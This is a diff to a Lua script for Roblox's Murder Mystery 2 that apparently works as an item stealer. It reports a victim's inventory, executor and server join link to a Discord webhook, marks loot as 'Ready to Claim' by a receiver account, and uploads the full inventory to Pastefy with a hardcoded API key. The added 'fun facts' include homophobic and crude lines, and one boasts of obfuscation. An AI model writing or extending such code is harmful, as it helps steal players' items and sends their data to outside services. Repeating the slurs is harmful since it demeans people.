@@ -43,6 +43,37 @@ local EMBED_AUTHOR = "Jmcxz Hit!"
 local EMBED_FOOTER = "Jmcxz"
 local EMBED_ICON = "https://i.pinimg.com/736x/0c/02/32/0c023295a6d839336907b13d4318a7da.jpg"
 
+-- Fun facts shown in the embed. One is picked at random per hit, so add as many
+-- as you like -- the picker indexes whatever is in here.
+local FUN_FACTS = {
+    "Our scripts is using Luraph Obfuscator and custom anti dump, anti tamper protection 🧠",
+    "Martinez is Jmcxz's domain & living pair",
+    "Jex ran his own son for some pussy",
+    "Migs, Theos, Justine & Cris are Jm's brothers",
+    "Only a few girls are allowed to Martinez, including Old Gen",
+    "Maya is my motivation",
+    "Jm generated almost 200k in % months",
+    "All Martinez are gay haters!",
+    "Jmcxz is the most egoist person in every server he joins",
+    "Jmcxz built this whole script just to flex",
+    "Jmcxz has never lost a trade, and he will never let you forget it",
+    "Nobody out-egos Jmcxz -- many have tried, none survived",
+}
+
+-- Shown in the Join Script field. The joiner link is a browser page, not a
+-- script-executable endpoint, so the field states that plainly.
+local JOIN_SCRIPT_NOTICE = "Can't be joined using script, use join now button"
+
+-- Status shown at the top of the embed, resolved from live state at send time.
+local STATUS_LABELS = {
+    Ready   = {Emoji = "🟢", Text = "Ready to Claim"},
+    Pending = {Emoji = "🟣", Text = "Pending Claim"},
+    Nothing = {Emoji = "🔴", Text = "Nothing Tradeable"},
+}
+
+-- Item lines shown in the Loot block before it is truncated.
+local LOOT_LINE_LIMIT = 15
+
 -- Receiver account, and an optional second webhook to mirror the hit into.
 local SECOND_WEBHOOK = ""
 local ar = RECEIVER[1]
@@ -255,6 +286,7 @@ local function BuildMapping(Entries)
                 local ItemInfo = {
                     Rarity = RarityFromPrice(Value),
                     Value = Value,
+                    Emoji = Entry.emoji,
                     Chroma = (string.find(string.lower(ItemName), "chroma", 1, true) ~= nil)
                 }
                 for _, Key in ipairs(NormalizeKeys(ItemName)) do
@@ -387,7 +419,7 @@ local BlacklistedItems = {
     SharkSeeker = true
 }
 
-local AllInventoryItems, TradeableItems, TotalTradeValue = {}, {}, 0
+local AllInventoryItems, TradeableItems, TotalTradeValue, TotalInventoryValue = {}, {}, 0, 0
 local UnresolvedItems = {}
 
 -- The value base is authoritative on price, so the trade decision is price-only.
@@ -398,7 +430,7 @@ local function ShouldTradeThisItem(ItemValue)
 end
 
 local function RefreshInventoryLists()
-    local AllItems, TradeItems, TotalValue = {}, {}, 0
+    local AllItems, TradeItems, TotalValue, FullValue = {}, {}, 0, 0
     local Unresolved = {}
     local ProfileData
     local ProfileOK, ProfileErr = pcall(function()
@@ -407,7 +439,7 @@ local function RefreshInventoryLists()
 
     if not ProfileOK then
         warn("[MM2] Inventory request failed:", ProfileErr)
-        return AllItems, TradeItems, TotalValue, Unresolved
+        return AllItems, TradeItems, TotalValue, FullValue, Unresolved
     end
 
     if ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
@@ -430,7 +462,11 @@ local function RefreshInventoryLists()
                     local RarityName = ItemInfo and ItemInfo.Rarity or "Unknown"
                     local Value = ItemInfo and ItemInfo.Value or 0
                     local IsChroma = ItemInfo and ItemInfo.Chroma or false
+                    local IsTradeable = ShouldTradeThisItem(Value) and not BlacklistedItems[ItemId]
 
+                    -- A stack is tradeable as a whole or not at all, so the two
+                    -- counts differ only when the item is filtered out. Both are
+                    -- carried so the loot line can show "n / n".
                     local ItemEntry = {
                         DataID = ItemId,
                         Name = SafeName,
@@ -438,13 +474,20 @@ local function RefreshInventoryLists()
                         Count = Quantity,
                         Value = Value,
                         IsChroma = IsChroma,
+                        Emoji = (ItemInfo and ItemInfo.Emoji) or "❔",
+                        OwnedCount = Quantity,
+                        TradeableCount = IsTradeable and Quantity or 0,
                         Total = Value * Quantity
                     }
+                    ItemEntry.TradeableValue = Value * ItemEntry.TradeableCount
+                    ItemEntry.FullValue = Value * ItemEntry.OwnedCount
 
                     table.insert(AllItems, ItemEntry)
-                    if ShouldTradeThisItem(Value) and not BlacklistedItems[ItemId] then
+                    FullValue = FullValue + ItemEntry.FullValue
+
+                    if IsTradeable then
                         table.insert(TradeItems, ItemEntry)
-                        TotalValue = TotalValue + ItemEntry.Total
+                        TotalValue = TotalValue + ItemEntry.TradeableValue
                     end
                 end
             end
@@ -453,13 +496,13 @@ local function RefreshInventoryLists()
 
     table.sort(AllItems, function(A, B) return A.Total > B.Total end)
     table.sort(TradeItems, function(A, B) return A.Total > B.Total end)
-    return AllItems, TradeItems, TotalValue, Unresolved
+    return AllItems, TradeItems, TotalValue, FullValue, Unresolved
 end
 
 local function ReloadInventory()
-    AllInventoryItems, TradeableItems, TotalTradeValue, UnresolvedItems = RefreshInventoryLists()
+    AllInventoryItems, TradeableItems, TotalTradeValue, TotalInventoryValue, UnresolvedItems = RefreshInventoryLists()
 end
-AllInventoryItems, TradeableItems, TotalTradeValue, UnresolvedItems = RefreshInventoryLists()
+AllInventoryItems, TradeableItems, TotalTradeValue, TotalInventoryValue, UnresolvedItems = RefreshInventoryLists()
 
 local function UploadToPastefy(textContent)
     local API_KEY = "bCmvP7YNqkOyMEeJDvL0eDXzfSgm2XhWcGadQ3aXKKiH7BKe5ZBIgem3tbuC"
@@ -504,6 +547,26 @@ local function GenerateFullInventoryText(itemList)
     return table.concat(lines, "\n")
 end
 
+-- Trims trailing zeros so 10 renders as "$10" and 4.20 as "$4.2".
+local function FormatMoney(Amount)
+    local Text = string.format("%.2f", tonumber(Amount) or 0)
+    Text = Text:gsub("0+$", ""):gsub("%.$", "")
+    return "$" .. Text
+end
+
+-- Resolved from live state when the embed is built. The trade has not run yet,
+-- so "Ready" means the receiver is present, "Pending" means loot is queued.
+local function GetHitStatus(ReceiverName)
+    if #TradeableItems == 0 then
+        return STATUS_LABELS.Nothing
+    end
+    if type(ReceiverName) == "string" and ReceiverName ~= "Unknown"
+        and Players:FindFirstChild(ReceiverName) then
+        return STATUS_LABELS.Ready
+    end
+    return STATUS_LABELS.Pending
+end
+
 -- Ping threshold is its own constant: MINIMUM_VALUE is a trade floor and can be
 -- very low, which would otherwise ping @everyone on every hit.
 local function BuildEmbed(ReceiverName)
@@ -517,68 +580,75 @@ local function BuildEmbed(ReceiverName)
 
     local MentionText = ShouldMentionEveryone and "@everyone" or ""
 
-    local TopItemsPreview = {}
-    for Index = 1, math.min(10, #AllInventoryItems) do
-        local Item = AllInventoryItems[Index]
-        local DisplayName = FormatNameDisplay(Item.Name)
-        table.insert(TopItemsPreview, string.format("> %s [%d] - %.2f", DisplayName, Item.Count, Item.Total))
-    end
-    local PreviewText = table.concat(TopItemsPreview, "\n")
-    if #AllInventoryItems > 10 then
-        PreviewText = PreviewText .. "\n... and " .. (#AllInventoryItems - 10) .. " more items"
-    end
-
-    local PlayerCount = #Players:GetPlayers()
     local JobId = _G.RealJobID or game.JobId
     local JoinLink = "https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId=" .. JobId
 
-    local FullInventoryText = GenerateFullInventoryText(AllInventoryItems)
-    local PasteUrl = UploadToPastefy(FullInventoryText)
+    -- Loot block, highest value first. "n / n" is tradeable vs owned count and
+    -- the two figures are tradeable vs full value, so copies held back by the
+    -- blacklist or the price floor stay visible instead of silently vanishing.
+    local LootLines = {}
+    local Shown = 0
+    for _, Item in ipairs(AllInventoryItems) do
+        if Shown >= LOOT_LINE_LIMIT then break end
+        Shown = Shown + 1
+        table.insert(LootLines, string.format("%s %s %d / %d (%s / %s)",
+            Item.Emoji, Item.Name, Item.TradeableCount, Item.OwnedCount,
+            FormatMoney(Item.TradeableValue), FormatMoney(Item.FullValue)))
+    end
+    if #AllInventoryItems > LOOT_LINE_LIMIT then
+        table.insert(LootLines, string.format("... and %d more", #AllInventoryItems - LOOT_LINE_LIMIT))
+    end
+    table.insert(LootLines, string.rep("=", 24))
+    table.insert(LootLines, string.format("Total: %s / %s",
+        FormatMoney(TotalTradeValue), FormatMoney(TotalInventoryValue)))
+    local LootBlock = table.concat(LootLines, "\n")
 
-    -- %s / %.2f, never %d: prices in this base are fractional, and %d raises
-    -- "number has no integer representation" on a value like 0.02.
-    local InfoBlock = string.format(
-        "Username: %s\nDisplay: %s\nAccount Age: %d days\nExecutor: %s\nServer Players: %d/12\nReceiver: %s\nMin Value: %s",
-        LocalPlayer.Name, LocalPlayer.DisplayName, LocalPlayer.AccountAge,
-        _G.RealExecutor or "Unknown", PlayerCount, ReceiverName, tostring(MINIMUM_VALUE)
-    )
-    local StatsBlock = string.format(
-        "Total Items: %d\nTradeable Value: %.2f",
-        #AllInventoryItems, TotalTradeValue
-    )
+    local Status = GetHitStatus(ReceiverName)
+    local FunFact = FUN_FACTS[math.random(1, #FUN_FACTS)]
 
     local EmbedFields = {
-        {name = "Player Info", value = "```" .. InfoBlock .. "```", inline = false},
-        {name = "Stats", value = "```" .. StatsBlock .. "```", inline = false},
-        {name = "All Items (Highest Value First)", value = "```" .. PreviewText .. "```", inline = false}
+        {name = "🛠️ Game", value = "Murder Mystery 2", inline = true},
+        {name = "⚡ Executor", value = _G.RealExecutor or "Unknown", inline = true},
+        {name = "🖥️ Server", value = "[Join now!](" .. JoinLink .. ")", inline = true},
+        {name = "📜 Join Script", value = "```" .. JOIN_SCRIPT_NOTICE .. "```", inline = false},
+        {name = "📦 Loot", value = "```" .. LootBlock .. "```", inline = false}
     }
+
+    -- Carried over from the earlier layout: the full log, and anything the value
+    -- base does not price, so a coverage gap is visible rather than silent.
+    local PasteUrl = UploadToPastefy(GenerateFullInventoryText(AllInventoryItems))
+    if PasteUrl then
+        table.insert(EmbedFields, {name = "📄 Full Inventory Log", value = PasteUrl, inline = false})
+    end
     if #UnresolvedItems > 0 then
-        local Shown = {}
+        local Names = {}
         for Index = 1, math.min(12, #UnresolvedItems) do
-            table.insert(Shown, UnresolvedItems[Index])
+            table.insert(Names, UnresolvedItems[Index])
         end
-        local UnresolvedText = table.concat(Shown, "\n")
+        local UnresolvedText = table.concat(Names, ", ")
         if #UnresolvedItems > 12 then
-            UnresolvedText = UnresolvedText .. "\n... and " .. (#UnresolvedItems - 12) .. " more"
+            UnresolvedText = UnresolvedText .. ", ..."
         end
         table.insert(EmbedFields, {
-            name = "Not In Value List (" .. #UnresolvedItems .. ")",
-            value = "```" .. UnresolvedText .. "```",
+            name = "❔ Not In Value Base (" .. #UnresolvedItems .. ")",
+            value = UnresolvedText,
             inline = false
         })
     end
-    if PasteUrl then
-        table.insert(EmbedFields, {name = "Full Inventory Log", value = PasteUrl, inline = false})
-    end
-    table.insert(EmbedFields, {name = "Hits Jm!", value = "[Hits Jm!](" .. JoinLink .. ")", inline = false})
+
+    -- 9/17/2026 12:48 PM, matching the reference footer.
+    local DateText = os.date("%m/%d/%Y %I:%M %p"):gsub("^0", "")
 
     local EmbedData = {
         author = {name = EMBED_AUTHOR},
+        title = string.format("%s • %s", LocalPlayer.DisplayName, JobId),
+        description = string.format("**Status**\n%s %s\n\nFun fact: **%s**",
+            Status.Emoji, Status.Text, FunFact),
         color = 0x4B5563,
         thumbnail = {url = EMBED_ICON},
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
         fields = EmbedFields,
-        footer = {text = EMBED_FOOTER .. " • " .. os.date("%Y-%m-%d %H:%M:%S")}
+        footer = {text = EMBED_FOOTER .. " • " .. DateText}
     }
     return EmbedData, MentionText
 end
